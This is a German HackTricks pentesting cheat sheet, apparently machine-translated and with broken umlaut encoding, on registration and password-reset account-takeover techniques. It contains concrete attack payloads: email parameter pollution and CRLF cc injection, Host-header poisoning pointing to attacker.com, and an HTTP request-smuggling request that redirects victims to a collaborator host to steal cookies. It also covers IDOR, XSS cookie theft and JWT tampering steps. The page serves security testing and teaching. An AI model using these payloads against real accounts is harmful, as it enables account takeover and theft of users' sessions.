# Registrierung & √úbernahmeanf√§lligkeiten

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}


## Registrierung √úbernahme

### Doppelte Registrierung

* Versuche, einen bestehenden Benutzernamen zu generieren
* √úberpr√ºfe verschiedene E-Mails:
* Gro√übuchstaben
* \+1@
* f√ºge einen Punkt in die E-Mail ein
* Sonderzeichen im E-Mail-Namen (%00, %09, %20)
* Setze schwarze Zeichen nach der E-Mail: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Benutzernamen Enumeration

√úberpr√ºfe, ob du herausfinden kannst, wann ein Benutzername bereits in der Anwendung registriert wurde.

### Passwort-Richtlinie

Erstelle einen Benutzer und √ºberpr√ºfe die Passwort-Richtlinie (√ºberpr√ºfe, ob du schwache Passw√∂rter verwenden kannst).\
In diesem Fall kannst du versuchen, Anmeldeinformationen zu bruteforcen.

### SQL-Injection

[**√úberpr√ºfe diese Seite** ](sql-injection/#insert-statement), um zu lernen, wie man Konto√ºbernahmen versucht oder Informationen √ºber **SQL-Injection** in Registrierungsformularen extrahiert.

### Oauth √úbernahmen

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML-Anf√§lligkeiten

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### E-Mail √§ndern

Wenn registriert, versuche, die E-Mail zu √§ndern und √ºberpr√ºfe, ob diese √Ñnderung korrekt validiert wird oder ob du sie auf beliebige E-Mails √§ndern kannst.

### Weitere √úberpr√ºfungen

* √úberpr√ºfe, ob du **wegwerfbare E-Mails** verwenden kannst
* **Langes** **Passwort** (>200) f√ºhrt zu **DoS**
* **√úberpr√ºfe die Ratenlimits bei der Kontoerstellung**
* Verwende username@**burp\_collab**.net und analysiere den **Callback**

## **Passwortzur√ºcksetzungs√ºbernahme**

### Passwortzur√ºcksetzung Token-Leck √ºber Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Fordere eine Passwortzur√ºcksetzung an deine E-Mail-Adresse an
2. Klicke auf den Link zur Passwortzur√ºcksetzung
3. √Ñndere das Passwort nicht
4. Klicke auf beliebige 3rd Party-Websites (z.B.: Facebook, Twitter)
5. Fange die Anfrage im Burp Suite Proxy ab
6. √úberpr√ºfe, ob der Referer-Header das Passwortzur√ºcksetzungstoken leakt.

### Passwortzur√ºcksetzung Vergiftung <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Fange die Passwortzur√ºcksetzungsanfrage in Burp Suite ab
2. F√ºge die folgenden Header in Burp Suite hinzu oder bearbeite sie: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Leite die Anfrage mit dem modifizierten Header weiter\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Suche nach einer Passwortzur√ºcksetzungs-URL basierend auf dem _Host-Header_ wie: `https://attacker.com/reset-password.php?token=TOKEN`

### Passwortzur√ºcksetzung √ºber E-Mail-Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Angreifer m√ºssen sich mit ihrem Konto anmelden und zur Funktion **Passwort √§ndern** gehen.
2. Starten Sie die Burp Suite und fangen Sie die Anfrage ab.
3. Senden Sie sie an den Repeater-Tab und bearbeiten Sie die Parameter: Benutzer-ID/E-Mail\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Das Passwort-Reset-Token sollte zuf√§llig generiert und jedes Mal einzigartig sein.\
Versuchen Sie zu bestimmen, ob das Token abl√§uft oder ob es immer dasselbe ist. In einigen F√§llen ist der Generierungsalgorithmus schwach und kann erraten werden. Die folgenden Variablen k√∂nnten vom Algorithmus verwendet werden.

* Zeitstempel
* Benutzer-ID
* E-Mail des Benutzers
* Vorname und Nachname
* Geburtsdatum
* Kryptographie
* Nur Zahlen
* Kleine Token-Sequenz (Zeichen zwischen \[A-Z,a-z,0-9])
* Token-Wiederverwendung
* Ablaufdatum des Tokens

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. L√∂sen Sie eine Passwort-Reset-Anfrage √ºber die API/UI f√ºr eine bestimmte E-Mail aus, z.B.: test@mail.com
2. √úberpr√ºfen Sie die Serverantwort und suchen Sie nach `resetToken`
3. Verwenden Sie dann das Token in einer URL wie `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrieren Sie sich im System mit einem Benutzernamen, der identisch mit dem Benutzernamen des Opfers ist, jedoch mit Leerzeichen vor und/oder nach dem Benutzernamen. z.B.: `"admin "`
2. Fordern Sie einen Passwort-Reset mit Ihrem b√∂swilligen Benutzernamen an.
3. Verwenden Sie das Token, das an Ihre E-Mail gesendet wurde, und setzen Sie das Passwort des Opfers zur√ºck.
4. Melden Sie sich mit dem neuen Passwort beim Konto des Opfers an.

Die Plattform CTFd war anf√§llig f√ºr diesen Angriff.\
Siehe: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finden Sie ein XSS innerhalb der Anwendung oder einer Subdomain, wenn die Cookies auf die √ºbergeordnete Domain beschr√§nkt sind: `*.domain.com`
2. Leaken Sie das aktuelle **Sessions-Cookie**
3. Authentifizieren Sie sich als der Benutzer mit dem Cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Verwenden Sie **smuggler**, um den Typ des HTTP Request Smuggling (CL, TE, CL.TE) zu erkennen\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Erstellen Sie eine Anfrage, die `POST / HTTP/1.1` mit den folgenden Daten √ºberschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, die Opfer zu burpcollab umzuleiten und ihre Cookies zu stehlen\
3\. Die endg√ºltige Anfrage k√∂nnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone-Berichte, die diesen Fehler ausnutzen\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Konto√ºbernahme √ºber CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstellen Sie ein Payload f√ºr das CSRF, z.B.: ‚ÄûHTML-Formular mit automatischer √úbermittlung f√ºr eine Passwort√§nderung‚Äú
2. Senden Sie das Payload

### Konto√ºbernahme √ºber JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token k√∂nnte verwendet werden, um einen Benutzer zu authentifizieren.

* Bearbeiten Sie das JWT mit einer anderen Benutzer-ID / E-Mail
* √úberpr√ºfen Sie die schwache JWT-Signatur

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referenzen

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
